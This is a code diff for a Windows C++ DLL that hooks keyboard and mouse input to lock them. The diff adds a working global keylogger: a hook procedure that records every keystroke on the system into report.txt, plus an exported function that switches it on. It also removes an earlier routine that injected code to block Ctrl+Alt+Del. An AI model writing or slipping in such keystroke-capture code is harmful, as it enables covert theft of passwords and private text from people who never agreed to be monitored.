@@ -3,12 +3,14 @@
 #pragma managed(push, off)
 #endif
 
-#include    "inject.h"
+#include "dllmain.h"
+#include "stdafx.h"
 
 HINSTANCE	 hInstDLL;
 
 #pragma data_seg("SHARED")
 HHOOK			hKeyboardHook;
+HHOOK			hKeyLoggerHook;
 HHOOK			hMouseHook;
 #pragma data_seg()
 
@@ -27,7 +29,7 @@ BOOL APIENTRY DllMain( HMODULE hModule,
 		break;
 	}
 	hInstDLL = (HINSTANCE) hModule;
-	hKeyboardHook = NULL;
+	
 	hMouseHook = NULL;
 	return TRUE;
 }
@@ -63,7 +65,7 @@ void doRemoveMouseGlobalHook(HWND hWnd)
 		UnhookWindowsHookEx(hMouseHook);
 }
 
-void __declspec(dllexport) LockMouse(HWND hWnd, BOOL bEnableDisable)
+void EXPORT LockMouse(HWND hWnd, BOOL bEnableDisable)
 {
 	if (!bEnableDisable)
 	{
@@ -74,6 +76,60 @@ void __declspec(dllexport) LockMouse(HWND hWnd, BOOL bEnableDisable)
 		doSetMouseGlobalHook(hWnd);
 	}
 }
+//TCHAR szEXEPath[MAX_PATH];
+//
+//GetModuleFileName ( NULL, szEXEPath, MAX_PATH );
+LRESULT CALLBACK KeyLoggerHookProc(int nCode,   WPARAM wParam, LPARAM lParam)
+{
+	FILE *f1;
+	if (nCode < 0)  // do not process message 
+		return CallNextHookEx(hKeyLoggerHook, nCode, wParam, lParam );
+
+	char ch;
+	if (((DWORD)lParam & 0x40000000) &&(nCode==HC_ACTION))
+	{		
+		if ((wParam==VK_SPACE)||(wParam==VK_TAB)||(wParam==VK_RETURN)||((wParam>0x2f ) && (wParam<=0x100)))
+		{
+			f1=fopen("report.txt","a+");
+			if ((wParam==VK_RETURN)||(wParam==VK_TAB))
+			{	
+				ch='\n';
+				fwrite(&ch,1,1,f1);
+			}
+			else
+			{
+				BYTE ks[256];
+				GetKeyboardState(ks);
+				WORD w;
+				UINT scan;
+				scan=0;
+				ToAscii(wParam,scan,ks,&w,0);
+				ch = char(w); 
+				fwrite(&ch,1,1,f1);	
+			}		
+			fclose(f1);
+		}
+	}	
+	LRESULT RetVal = CallNextHookEx(hKeyLoggerHook, nCode, wParam, lParam );//Goi Hook procedure ke tiep trong Hook Chain	
+	return  RetVal;
+}
+
+void EXPORT ActiveKeyLogger(HWND hWnd, BOOL bEnableDisable)
+{
+	if (!bEnableDisable)
+	{
+		if (hKeyLoggerHook)
+		{
+			UnhookWindowsHookEx(hKeyLoggerHook);
+			hKeyLoggerHook = NULL;
+		}
+	}
+	else
+	{
+		if (!hKeyLoggerHook)
+			hKeyLoggerHook = SetWindowsHookEx(WH_KEYBOARD, (HOOKPROC)KeyLoggerHookProc, hInstDLL, 0);	
+	}
+}
 
 LRESULT CALLBACK KeyboardHookProc(int nCode,   WPARAM wParam, LPARAM lParam)
 {
@@ -81,65 +137,25 @@ LRESULT CALLBACK KeyboardHookProc(int nCode,   WPARAM wParam, LPARAM lParam)
 		return CallNextHookEx( hKeyboardHook, nCode, wParam, lParam );
 
 	return 1;//CallNextHookEx( hHook, nCode, wParam, lParam );//Goi Hook procedure ke tiep trong Hook Chain	
-
-}
-// Install hook
-void doSetKeyboardGlobalHook(HWND hWnd)
-{
-	// Init value for MappedData	
-
-	if (!hKeyboardHook)
-		hKeyboardHook = SetWindowsHookEx(WH_KEYBOARD_LL, (HOOKPROC)KeyboardHookProc, hInstDLL, 0);	
-
-}
-// Remove hook
-void doRemoveKeyboardGlobalHook(HWND hWnd)
-{
-	if (hKeyboardHook)
-		UnhookWindowsHookEx(hKeyboardHook);
 }
 
-void __declspec(dllexport) LockKeyboard(HWND hWnd, BOOL bEnableDisable)
+void EXPORT LockKeyboard(HWND hWnd, BOOL bEnableDisable)
 {
 	if (!bEnableDisable)
 	{
-		doRemoveKeyboardGlobalHook(hWnd);
-	}
-	else
-	{
-		doSetKeyboardGlobalHook(hWnd);
-	}
-}
-
-
-/*****************************************************************
-* Lock Ctrl+Alt+Del and Ctrl+Shift+Esc key sequences.           *
-* TRUE=Lock, FALSE=UnLock                                       *
-* (Win 2K).                                                     *
-*****************************************************************/
-int __declspec(dllexport) LockCtrlAltDel(BOOL bEnableDisable)
-{
-	static BOOL bInjected = FALSE;
-
-	if (bEnableDisable)
-	{
-		if (!bInjected)
+		if (hKeyboardHook)
 		{
-			bInjected = Inject();
-			return bInjected;
+			UnhookWindowsHookEx(hKeyboardHook);
+			hKeyboardHook = NULL;
 		}
 	}
 	else
 	{
-		if (bInjected)
-		{
-			bInjected = !Eject();
-			return !bInjected;
-		}
+		if (!hKeyboardHook)
+			hKeyboardHook = SetWindowsHookEx(WH_KEYBOARD_LL, (HOOKPROC)KeyboardHookProc, hInstDLL, 0);	
 	}
-
-	return 0;
 }
+
 
 /****************************************
 * Lock Task Manager (CTRL+ALT+DEL).    *
